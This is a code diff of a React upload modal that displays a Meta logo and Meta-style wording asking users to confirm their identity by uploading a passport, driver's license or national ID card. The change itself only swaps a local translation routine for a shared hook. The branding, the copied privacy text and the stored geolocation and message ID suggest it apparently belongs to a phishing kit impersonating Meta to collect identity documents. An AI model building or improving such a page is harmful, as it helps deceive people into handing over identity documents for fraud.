@@ -1,41 +1,19 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
+import useTranslation from '@/hooks/useTranslation';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
 import { faClose } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import Image from 'next/image';
-import { type ChangeEvent, type FC, useEffect, useRef, useState } from 'react';
+import { type ChangeEvent, type FC, useRef, useState } from 'react';
 
 const UploadModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const fileInputRef = useRef<HTMLInputElement>(null);
     const [uploading, setUploading] = useState(false);
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [documentType, setDocumentType] = useState('passport');
 
-    const { geoInfo, messageId } = store();
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Confirm your identity', 'Choose type of ID to upload', "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.", 'Passport', "Driver's license", 'National ID card', `Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.`, 'Learn more', 'Upload Image', 'Uploading...'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
+    const { t } = useTranslation();
+    const { messageId } = store();
 
     const handleFileChange = async (event: ChangeEvent<HTMLInputElement>) => {
         const file = event.target.files ? event.target.files[0] : null;
